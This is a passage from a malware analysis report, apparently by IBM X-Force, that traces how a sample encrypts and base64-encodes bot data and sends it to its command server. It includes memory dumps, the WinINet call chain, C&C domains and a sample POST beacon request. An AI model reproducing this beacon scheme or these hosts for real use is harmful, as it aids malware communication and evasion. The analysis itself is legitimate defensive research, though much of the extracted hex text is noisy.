37 33 35 6B 6C 70 73 7A
32 2E 30 2E 30 2E 30 68
00 67 73 75 62 54 79 70
73 73 18 20 6B 64 77 54
00 64 44 61 74 61 A2 66
6C 70 44 61 74 61 40 A7
49 44 78 30 49 2D 43 39
41 30 34 23 39 37 32 39
42 35 35 41 30 45 42 44
31 37 33 35 6B 6C 70 73
67 32 2E 30 2E 30 2E 30
65 00 67 73 75 62 54 79
65 73 73 18 20 6B 64 77
70 00 64 44 61 74 61 A2
66 6C 70 44 61 74 61 40

....yxeFZrvcxéºi
lpszBotIDx0I-C95
7A26036A04#97295
8A65880B55A0EBD5
559078C1735klpsz
Versiong2.0.0.0h
mainType.gsubTyp
e.gBitness. kdwT
imestamp.dDataóf
[email protected]º
ilpszBotIDx0I-C9
57A26036A04#9729
58A65880B55A0EBD
5559078C1735klps
zVersiong2.0.0.0
hmainType.gsubTy
pe.gBitness. kdw
Timestamp.dDataó
[email protected]

length of the random string (9)
pseudo-randomly generated 9 bytes string.
0
data (here data size is 0x123, total structure size is 0x130)

An additional, 9-byte-long, pseudorandom string is generated:
0012D6D8

78 6A 79 4C 4A 5A 51 61

64 00 00 00 30 D7 12 00

xjyLJZQad

An MD5 hash of the string is calculated:
0012D6BC

52 37 D7 C2 07 D1 D3 C6

B5 26 F4 FF AC 29 CF CB

R7+-.-+¦¦&( ¼)--

The above blob of data is encrypted using AES. The MD5 hash of the second
pseudorandom string is used as the key:

14/21

014CFBD0 99 76 C5 58 A7 34 93 BC
014CFBE0 B9 A2 47 46 1A FE 81 49
014CFBF0 41 43 25 91 3E 3A F7 DE
014CFC00 87 44 01 66 9F 1B 54 7D
014CFC10 56 DD BA 5F 63 2A 2C 01
014CFC20 54 5A 80 94 81 DA 1E 93
014CFC30 B2 52 D1 37 2A 19 40 C3
[email protected]+w.d¦-¦#}
014CFC40 10 31 8B A9 2E F1 4E 5E
014CFC50 07 C8 DB 3D 71 3A A8 96
014CFC60 11 41 26 AD BD 99 A5 79
014CFC70 88 C0 03 04 EF 59 5C 7E
014CFC80 00 37 D6 08 91 CD 76 DD
014CFC90 9B C4 B3 6B 49 41 F7 E8
014CFCA0 1A C2 81 1F 23 09 15 C7
014CFCB0 EA B8 74 28 D2 7F 09 34
014CFCC0 EE 22 A9 3F C9 91 DC 0E
014CFCD0 73 43 E1 86 88 03 AB 34
014CFCE0 EB A8 52 3C 8A 7D 13 23
014CFCF0 FD E4 C4 DF 75 CE DC B6

54 A6 85 54 DF 79 F6 1A
22 77 02 A2 10 ED EF 2D
9F C2 C8 EB FC 07 75 0F
A0 64 D8 02 6C C1 ED BA
B0 89 D4 19 FF 3F 4F 66
61 66 52 B4 B7 B5 45 09
77 07 EB B9 C2 B4 23 7D

Öv+Xº4ô+TªàT¯y÷.
¦óGF.¦.I"w.ó.fnAC%æ>:˜¦ƒ-+dn.u.
çD.fƒ.T}ád+.l-f¦
V¦¦_c*,.¦ë+. ?Of
TZÇö.+.ôafR¦+¦E.
¦R-7*

67 46 09 8B 1C 5B ED F1
58 F2 95 10 F0 D8 89 33
9A 11 DE A5 17 2A 68 86
D4 9F 13 7F D2 90 B5 2A
9B EF CD B3 61 BF 66 D5
34 39 64 17 5F CA AC 8B
01 6F 51 61 74 93 79 28
CC C2 01 CE 5B 94 F0 3C
CB 98 D0 06 8B 25 A8 CA
83 E3 FC 6A EA 01 57 52
6F B0 DA 08 FC 90 31 98
DA DD B7 23 7C A8 A0 9B

.1ï¬.±N^gF.ï.[f±
.+¦=q:¿ûX=ò.=+ë3
.A&¡+ÖÑyÜ.¦Ñ.*hå
ê+..nY\~+ƒ..-.¦*
.7+.æ-v¦¢n-¦a+f+
¢-¦kIA˜F49d._-¼ï
.-..#..¦.oQatôy(
O+t(-..4¦-.+[ö=<
e"¬?+æ_.-ÿ-.ï%¿sCßåê.½4âpnjO.WR
d¿R<è}.#o¦+.n.1ÿ
²S-¯u+_¦+¦+#|¿á¢

The following data is generated based on the hard-coded data used to generate the initial
AES key for encrypting data in the registry:
014CE830
014CE840
014CE850
014CE860
014CE870
014CE880
014CE890
014CE8A0
014CE8B0
014CE8C0
014CE8D0

AA 00 00 00 08 00 CC F6
CA E5 6C EA 1C 81 C8 DD
A1 DF B2 2A 28 00 08 00
64 A3 45 4C 43 94 C5 8F
19 F0 DA 08 E7 24 22 00
CE 54 FD 53 75 AB 3D 1F
2C 15 09 DB 0E F2 A4 59
D4 71 5A D6 74 98 72 D0
A7 5D 4C B0 FA B7 39 C2
D9 5E 85 2F D6 0B 94 36
69 8A FF 03 7F 20 82 20

B7 9B 80 C0 6A 76 81 52
56 FD 6B D4 99 71 5E 9D
8A 78 46 D8 AA F0 D1 BB
ED A1 03 BD 1A 8A 38 5D
08 00 FA 8A 21 0E 84 DF
99 23 43 9E 39 AE A2 55
1A 00 08 00 88 26 CF E5
5E 8C A6 F3 A1 CF 9C 5B
7B A2 30 00 08 00 A4 06
79 56 B6 31 73 87 18 F8
14 28 51 E5 1A 00 AD BA

¬.....¦÷+¢Ç+jv.R
-slO..+¦V²k+Öq^.
í¯¦*(...èxF+¬=-+
dúELCö+.fí.+.è8]
.=+.t$"...·è!.ä¯
+T²Su½=.Ö#CP9«óU
,..¦.=ñY....ê&-s
+qZ+tÿr-^îª=í-£[
º]L¦·+9-{ó0...ñ.
+^à/+.ö6yV¦1sç.°
iè .. é .(Qs..¡¦

This data is concatenated with the AES encrypted buffer:

15/21

014CFD18 AA 00 00 00 08 00 CC F6
014CFD28 CA E5 6C EA 1C 81 C8 DD
014CFD38 A1 DF B2 2A 28 00 08 00
014CFD48 64 A3 45 4C 43 94 C5 8F
014CFD58 19 F0 DA 08 E7 24 22 00
014CFD68 CE 54 FD 53 75 AB 3D 1F
014CFD78 2C 15 09 DB 0E F2 A4 59
014CFD88 D4 71 5A D6 74 98 72 D0
014CFD98 A7 5D 4C B0 FA B7 39 C2
014CFDA8 D9 5E 85 2F D6 0B 94 36
014CFDB8 69 8A FF 03 7F 20 82 20
014CFDC8 C5 58 A7 34 93 BC 54 A6
014CFDD8 47 46 1A FE 81 49 22 77
014CFDE8 25 91 3E 3A F7 DE 9F C2
014CFDF8 01 66 9F 1B 54 7D A0 64
014CFE08 BA 5F 63 2A 2C 01 B0 89
014CFE18 80 94 81 DA 1E 93 61 66
014CFE28 D1 37 2A 19 40 C3 77 07
[email protected]+w.d¦-¦#}.1
014CFE38 8B A9 2E F1 4E 5E 67 46
014CFE48 DB 3D 71 3A A8 96 58 F2
014CFE58 26 AD BD 99 A5 79 9A 11
014CFE68 03 04 EF 59 5C 7E D4 9F
014CFE78 D6 08 91 CD 76 DD 9B EF
014CFE88 B3 6B 49 41 F7 E8 34 39
014CFE98 81 1F 23 09 15 C7 01 6F
014CFEA8 74 28 D2 7F 09 34 CC C2
014CFEB8 A9 3F C9 91 DC 0E CB 98
014CFEC8 E1 86 88 03 AB 34 83 E3
014CFED8 52 3C 8A 7D 13 23 6F B0
014CFEE8 C4 DF 75 CE DC B6 DA DD

B7 9B 80 C0 6A 76 81 52
56 FD 6B D4 99 71 5E 9D
8A 78 46 D8 AA F0 D1 BB
ED A1 03 BD 1A 8A 38 5D
08 00 FA 8A 21 0E 84 DF
99 23 43 9E 39 AE A2 55
1A 00 08 00 88 26 CF E5
5E 8C A6 F3 A1 CF 9C 5B
7B A2 30 00 08 00 A4 06
79 56 B6 31 73 87 18 F8
14 28 51 E5 1A 00 99 76
85 54 DF 79 F6 1A B9 A2
02 A2 10 ED EF 2D 41 43
C8 EB FC 07 75 0F 87 44
D8 02 6C C1 ED BA 56 DD
D4 19 FF 3F 4F 66 54 5A
52 B4 B7 B5 45 09 B2 52
EB B9 C2 B4 23 7D 10 31

¬.....¦÷+¢Ç+jv.R
-slO..+¦V²k+Öq^.
í¯¦*(...èxF+¬=-+
dúELCö+.fí.+.è8]
.=+.t$"...·è!.ä¯
+T²Su½=.Ö#CP9«óU
,..¦.=ñY....ê&-s
+qZ+tÿr-^îª=í-£[
º]L¦·+9-{ó0...ñ.
+^à/+.ö6yV¦1sç.°
iè .. é .(Qs..Öv
+Xº4ô+TªàT¯y÷.¦ó
GF.¦.I"w.ó.fn-AC
%æ>:˜¦ƒ-+dn.u.çD
.fƒ.T}ád+.l-f¦V¦
¦_c*,.¦ë+. ?OfTZ
Çö.+.ôafR¦+¦E.¦R
-7*

09 8B 1C 5B ED F1 07 C8
95 10 F0 D8 89 33 11 41
DE A5 17 2A 68 86 88 C0
13 7F D2 90 B5 2A 00 37
CD B3 61 BF 66 D5 9B C4
64 17 5F CA AC 8B 1A C2
51 61 74 93 79 28 EA B8
01 CE 5B 94 F0 3C EE 22
D0 06 8B 25 A8 CA 73 43
FC 6A EA 01 57 52 EB A8
DA 08 FC 90 31 98 FD E4
B7 23 7C A8 A0 9B AD BA

ï¬.±N^gF.ï.[f±.+
¦=q:¿ûX=ò.=+ë3.A
&¡+ÖÑyÜ.¦Ñ.*håê+
..nY\~+ƒ..-.¦*.7
+.æ-v¦¢n-¦a+f+¢¦kIA˜F49d._-¼ï...#..¦.oQatôy(O+
t(-..4¦-.+[ö=<e"
¬?+æ_.-ÿ-.ï%¿-sC
ßåê.½4âpnjO.WRd¿
R<è}.#o¦+.n.1ÿ²S
-¯u+_¦+¦+#|¿á¢¡¦

This buffer is then base64-encoded:

16/21

014CFF18
014CFF28
014CFF38
014CFF48
014CFF58
014CFF68
014CFF78
014CFF88
014CFF98
014CFFA8
014CFFB8
014CFFC8
014CFFD8
014CFFE8
014CFFF8
014D0008
014D0018
014D0028
014D0038
014D0048
014D0058
014D0068
014D0078
014D0088
014D0098
014D00A8
014D00B8
014D00C8
014D00D8
014D00E8
014D00F8
014D0108
014D0118
014D0128
014D0138
014D0148
014D0158
014D0168
014D0178
014D0188

71 67 41 41 41 41 67 41
61 6E 61 42 55 73 72 6C
56 76 31 72 31 4A 6C 78
4B 41 41 49 41 49 70 34
5A 4B 4E 46 54 45 4F 55
47 6F 6F 34 58 52 6E 77
43 41 44 36 69 69 45 4F
64 61 73 39 48 35 6B 6A
4C 42 55 4A 32 77 37 79
69 43 62 50 35 64 52 78
58 6F 79 6D 38 36 48 50
2B 72 63 35 77 6E 75 69
32 56 36 46 4C 39 59 4C
63 34 63 59 2B 47 6D 4B
46 43 68 52 35 52 6F 41
6B 37 78 55 70 6F 56 55
52 30 59 61 2F 6F 46 4A
37 79 31 42 51 79 57 52
79 4F 76 38 42 33 55 50
56 48 32 67 5A 4E 67 43
75 6C 39 6A 4B 69 77 42
54 32 5A 55 57 6F 43 55
55 72 53 33 74 55 55 4A
51 4D 4E 33 42 2B 75 35
69 36 6B 75 38 55 35 65
37 66 45 48 79 4E 73 39
6C 52 44 77 32 49 6B 7A
70 58 6D 61 45 64 36 6C
41 77 54 76 57 56 78 2B
74 53 6F 41 4E 39 59 49
7A 62 4E 68 76 32 62 56
39 2B 67 30 4F 57 51 58
67 52 38 6A 43 52 58 48
65 53 6A 71 75 48 51 6F
41 63 35 62 6C 50 41 38
33 41 37 4C 6D 4E 41 47
34 59 61 49 41 36 73 30
56 31 4C 72 71 46 49 38
32 67 6A 38 6B 44 47 59
33 4C 62 61 33 62 63 6A

7A 50 61 33 6D 34 44 41
62 4F 6F 63 67 63 6A 64
58 70 32 68 33 37 49 71
52 74 69 71 38 4E 47 37
78 59 2F 74 6F 51 4F 39
32 67 6A 6E 4A 43 49 41
68 4E 2F 4F 56 50 31 54
51 35 34 35 72 71 4A 56
70 46 6B 61 41 41 67 41
57 74 5A 30 6D 48 4C 51
6E 46 75 6E 58 55 79 77
4D 41 41 49 41 4B 51 47
6C 44 5A 35 56 72 59 78
2F 77 4E 2F 49 49 49 67
6D 58 62 46 57 4B 63 30
33 33 6E 32 47 72 6D 69
49 6E 63 43 6F 68 44 74
50 6A 72 33 33 70 2F 43
68 30 51 42 5A 70 38 62
62 4D 48 74 75 6C 62 64
73 49 6E 55 47 66 38 2F
67 64 6F 65 6B 32 46 6D
73 6C 4C 52 4E 79 6F 5A
77 72 51 6A 66 52 41 78
5A 30 59 4A 69 78 78 62
63 54 71 6F 6C 6C 6A 79
45 55 45 6D 72 62 32 5A
46 79 70 6F 68 6F 6A 41
31 4A 38 54 66 39 4B 51
6B 63 31 32 33 5A 76 76
6D 38 53 7A 61 30 6C 42
58 38 71 73 69 78 72 43
41 57 39 52 59 58 53 54
30 6E 38 4A 4E 4D 7A 43
37 69 4B 70 50 38 6D 52
69 79 57 6F 79 6E 4E 44
67 2B 50 38 61 75 6F 42
69 6E 30 54 49 32 2B 77
2F 65 54 45 33 33 58 4F
66 4B 69 67 6D 77 3D 3D

qgAAAAgAzPa3m4DA
anaBUsrlbOocgcjd
Vv1r1JlxXp2h37Iq
KAAIAIp4Rtiq8NG7
ZKNFTEOUxY/toQO9
Goo4XRnw2gjnJCIA
CAD6iiEOhN/OVP1T
das9H5kjQ545rqJV
LBUJ2w7ypFkaAAgA
iCbP5dRxWtZ0mHLQ
Xoym86HPnFunXUyw
+rc5wnuiMAAIAKQG
2V6FL9YLlDZ5VrYx
c4cY+GmK/wN/IIIg
FChR5RoAmXbFWKc0
k7xUpoVU33n2Grmi
R0Ya/oFJIncCohDt
7y1BQyWRPjr33p/C
yOv8B3UPh0QBZp8b
VH2gZNgCbMHtulbd
ul9jKiwBsInUGf8/
T2ZUWoCUgdoek2Fm
UrS3tUUJslLRNyoZ
QMN3B+u5wrQjfRAx
i6ku8U5eZ0YJixxb
7fEHyNs9cTqolljy
lRDw2IkzEUEmrb2Z
pXmaEd6lFypohojA
AwTvWVx+1J8Tf9KQ
tSoAN9YIkc123Zvv
zbNhv2bVm8Sza0lB
9+g0OWQXX8qsixrC
gR8jCRXHAW9RYXST
eSjquHQo0n8JNMzC
Ac5blPA87iKpP8mR
3A7LmNAGiyWoynND
4YaIA6s0g+P8auoB
V1LrqFI8in0TI2+w
2gj8kDGY/eTE33XO
3Lba3bcjfKigmw==

The base64-encoded buffer is checked for the presence of “+” and “=” characters. These
characters are replaced with “%2B” and “%3D”, respectively. The malware creates an
additional 7-byte-long pseudorandom string:
0012D780

6C 56 46 64 69 59 70 00

00 00 00 00 00 00 00 00

lVFdiYp

This string is then prepended to the base64-encoded buffer:

17/21

014D0C28
014D0C38
014D0C48
014D0C58
014D0C68
014D0C78
014D0C88
014D0C98
014D0CA8
014D0CB8
014D0CC8
014D0CD8
014D0CE8
014D0CF8
014D0D08
014D0D18
014D0D28
014D0D38
014D0D48
014D0D58
014D0D68
014D0D78
014D0D88
014D0D98
014D0DA8
014D0DB8
014D0DC8
014D0DD8
014D0DE8
014D0DF8
014D0E08
014D0E18
014D0E28
014D0E38
014D0E48
014D0E58
014D0E68

78 59 2F 74 6F 51 4F 39
32 67 6A 6E 4A 43 49 41
68 4E 2F 4F 56 50 31 54
51 35 34 35 72 71 4A 56
70 46 6B 61 41 41 67 41
57 74 5A 30 6D 48 4C 51
6E 46 75 6E 58 55 79 77
75 69 4D 41 41 49 41 4B
59 4C 6C 44 5A 35 56 72
42 47 6D 4B 2F 77 4E 2F
35 52 6F 41 6D 58 62 46
70 6F 56 55 33 33 6E 32
2F 6F 46 4A 49 6E 63 43
51 79 57 52 50 6A 72 33
42 33 55 50 68 30 51 42
5A 4E 67 43 62 4D 48 74
4B 69 77 42 73 49 6E 55
57 6F 43 55 67 64 6F 65
74 55 55 4A 73 6C 4C 52
42 25 32 42 75 35 77 72
6B 75 38 55 35 65 5A 30
45 48 79 4E 73 39 63 54
44 77 32 49 6B 7A 45 55
6D 61 45 64 36 6C 46 79
54 76 57 56 78 25 32 42
74 53 6F 41 4E 39 59 49
7A 62 4E 68 76 32 62 56
39 25 32 42 67 30 4F 57
72 43 67 52 38 6A 43 52
53 54 65 53 6A 71 75 48
7A 43 41 63 35 62 6C 50
6D 52 33 41 37 4C 6D 4E
4E 44 34 59 61 49 41 36
61 75 6F 42 56 31 4C 72
49 32 25 32 42 77 32 67
54 45 33 33 58 4F 33 4C
69 67 6D 77 25 33 44 25

47 6F 6F 34 58 52 6E 77
43 41 44 36 69 69 45 4F
64 61 73 39 48 35 6B 6A
4C 42 55 4A 32 77 37 79
69 43 62 50 35 64 52 78
58 6F 79 6D 38 36 48 50
25 32 42 72 63 35 77 6E
51 47 32 56 36 46 4C 39
59 78 63 34 63 59 25 32
49 49 49 67 46 43 68 52
57 4B 63 30 6B 37 78 55
47 72 6D 69 52 30 59 61
6F 68 44 74 37 79 31 42
33 70 2F 43 79 4F 76 38
5A 70 38 62 56 48 32 67
75 6C 62 64 75 6C 39 6A
47 66 38 2F 54 32 5A 55
6B 32 46 6D 55 72 53 33
4E 79 6F 5A 51 4D 4E 33
51 6A 66 52 41 78 69 36
59 4A 69 78 78 62 37 66
71 6F 6C 6C 6A 79 6C 52
45 6D 72 62 32 5A 70 58
70 6F 68 6F 6A 41 41 77
31 4A 38 54 66 39 4B 51
6B 63 31 32 33 5A 76 76
6D 38 53 7A 61 30 6C 42
51 58 58 38 71 73 69 78
58 48 41 57 39 52 59 58
51 6F 30 6E 38 4A 4E 4D
41 38 37 69 4B 70 50 38
41 47 69 79 57 6F 79 6E
73 30 67 25 32 42 50 38
71 46 49 38 69 6E 30 54
6A 38 6B 44 47 59 2F 65
62 61 33 62 63 6A 66 4B
33 44 00 00 00 00 00 00

xY/toQO9Goo4XRnw
2gjnJCIACAD6iiEO
hN/OVP1Tdas9H5kj
Q545rqJVLBUJ2w7y
pFkaAAgAiCbP5dRx
WtZ0mHLQXoym86HP
nFunXUyw%2Brc5wn
uiMAAIAKQG2V6FL9
YLlDZ5VrYxc4cY%2
BGmK/wN/IIIgFChR
5RoAmXbFWKc0k7xU
poVU33n2GrmiR0Ya
/oFJIncCohDt7y1B
QyWRPjr33p/CyOv8
B3UPh0QBZp8bVH2g
ZNgCbMHtulbdul9j
KiwBsInUGf8/T2ZU
WoCUgdoek2FmUrS3
tUUJslLRNyoZQMN3
B%2Bu5wrQjfRAxi6
ku8U5eZ0YJixxb7f
EHyNs9cTqolljylR
Dw2IkzEUEmrb2ZpX
maEd6lFypohojAAw
TvWVx%2B1J8Tf9KQ
tSoAN9YIkc123Zvv
zbNhv2bVm8Sza0lB
9%2Bg0OWQXX8qsix
rCgR8jCRXHAW9RYX
STeSjquHQo0n8JNM
zCAc5blPA87iKpP8
mR3A7LmNAGiyWoyn
ND4YaIA6s0g%2BP8
auoBV1LrqFI8in0T
I2%2Bw2gj8kDGY/e
TE33XO3Lba3bcjfK
igmw%3D%3D......

This data becomes the content of the request sent to the C&C by the malware. Shown below
is the sequence of WinINet APIs used by the malware in order to establish communication
with the C&C:
InternetOpenA -> InternetConnectA -> HttpOpenRequestA -> InternetSetOptionA ->
HttpAddRequestHeadersA -> InternetQueryOptionA -> InternetSetOptionA ->
HttpSendRequestA .

The malware creates a structure containing all request-related information:

18/21

0012C2F4
0012C304
0012C314
0012C324
+04
+10
+14
+1C
+20
+28
+2C
+2E

02 00 00 00 50 4F 53 54
10 1A 41 00 78 E4 12 00
96 02 00 00 00 00 00 00
66 74 2E 6B 63 73 73 6F

00 00 00 00 00 00 00 00
00 00 00 00 F0 7B 85 00
7F 00 00 01 50 00 73 6F
66 74 2E 62 69 7A 00 00

....POST........
..A.xS......={à.
û...........P.so
ft.kcssoft.biz..

request type
user-agent(pointer)
callback domain(pointer)
data(pointer)
data size
IP address
port
callback domain

Sample request:
POST /netreport.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
Host: linksbacksreport.com
Content-Length: 660
Cache-Control: no-cache
ROVivvn=qgAAAAgAnARHff0xZPE00vxRaB9ckHI5PjMe1aS2Esg25vckKQAIAKFrp8coemQ03zIpl
j77vqVlZSznbkKODJhKHmHZ4SsACAARNkkvw57mRSjtycoWwPyy0kftYPDihXzAUSN0V9sFAAgAxy
Dorqby0JdIt8dt3evWx2UzRarDJehmERfgEMusBQAIAKTf4bMa6zL6dkzPu3yq5/J8BUPk0e/ss9c
mZdJpBgMAxGjEiHDNUZ/0/FiYXB4uXxPAeTeNHTDj3LQEmuejOkcBEN4K0zB3ch2uTWPlpFHP5o68
X5BUP/1rFgCO%2BTHJ4hHJXylQY4hmm1LtyGHw5ZYaJxrMtWK%2BcKCeUVs/Hq/dV3E4BkeLklzkT
9S5%2B5oxSF6d4aAxyee7VzwAg9pBZGXZxyJQBDCVuAjyw1QSeial8vI69Q9I9ACgJ9YxWVeFHTF%
2B7CTzyqR3DChYFuNmzsZ8AUR6SpfyZKxRtRQpz3XEb0k7Wqk3WgJHAtzBhq5suMZzHYMQaeDow6Q
JIL52WsEPCig35m5EfIC9Bh1RZkcvnw44p7axtBQ3D2Ue7fKTFknARNvQHvkzXt7QiCUkwLBpUs1z
p3vhbhdyKVBCKP65biyzElXdZEh/D49UnoFG8w%3D%3D

Conclusion
The first stage was successful in hiding the main malware module from the antivirus engines
at the time it first appeared in the wild. But Stage 1 fails to hide the main module at present
as antivirus signatures. Encrypted communication creates difficulties for the dynamic
analysis since it makes it hard to understand the payload creation. Persistence mechanisms
employed by the malware (scheduling a task at the next login) is uncommon.
Igor Aronov
X-Force Advanced Researcher
Igor Aronov is a member of the IBM X-Force Advanced Research Team. After graduating
from NYU-POLY he went to work for the US government. His main areas of in...

19/21

20/21

21/21